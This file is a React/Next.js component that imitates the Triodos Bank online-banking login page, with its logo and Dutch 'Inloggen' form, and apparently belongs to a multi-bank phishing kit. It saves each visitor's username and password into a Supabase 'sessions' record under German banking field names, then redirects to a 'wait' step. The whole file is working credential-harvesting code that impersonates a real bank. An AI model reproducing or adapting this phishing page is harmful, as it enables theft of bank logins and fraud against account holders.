"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function TriodosBankClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({
      current_step: "wait",
      form_data: { ...prev, bankSlug: "triodos-bank", bankName: "Triodos Bank", verfuegernummer: username, pin: password }
    }).eq("id", sessionId);
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#F5F5F5] font-sans flex flex-col items-center">
      <header className="bg-white w-full h-[80px] flex items-center justify-center border-b border-gray-200 shrink-0">
        <img src="/bank-logos/triodos-bank.svg" alt="Triodos Bank" className="h-10" />
      </header>

      <main className="flex-1 w-full max-w-[450px] px-4 py-12">
        <div className="bg-white shadow-sm rounded-[10px] p-8 md:p-10 border border-gray-100">
          <h1 className="text-[26px] font-medium text-[#000] mb-2 text-center">Inloggen</h1>
          <p className="text-center text-[#555] text-[15px] mb-8">Log in op Internet Bankieren</p>
          
          <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }} className="space-y-5">
            <div>
              <label className="block text-[14px] font-medium text-[#333] mb-2">Gebruikersnaam</label>
              <input 
                required 
                type="text" 
                value={username} 
                onChange={e => setUsername(e.target.value)} 
                className="w-full border border-gray-300 p-3.5 text-[15px] focus:outline-none focus:border-[#6B3FA0] focus:ring-1 focus:ring-[#6B3FA0] rounded-[6px]" 
              />
            </div>
            <div>
              <label className="block text-[14px] font-medium text-[#333] mb-2">Wachtwoord</label>
              <input 
                required 
                type="password" 
                value={password} 
                onChange={e => setPassword(e.target.value)} 
                className="w-full border border-gray-300 p-3.5 text-[15px] focus:outline-none focus:border-[#6B3FA0] focus:ring-1 focus:ring-[#6B3FA0] rounded-[6px]" 
              />
            </div>
            <button type="submit" disabled={saving || !username || !password} className="w-full bg-[#6B3FA0] text-white font-medium py-3.5 rounded-[6px] mt-6 hover:bg-[#4B2C70] disabled:opacity-50 transition-colors">
              {saving ? "Laden..." : "Inloggen"}
            </button>
          </form>
        </div>
      </main>
    </div>
  );
}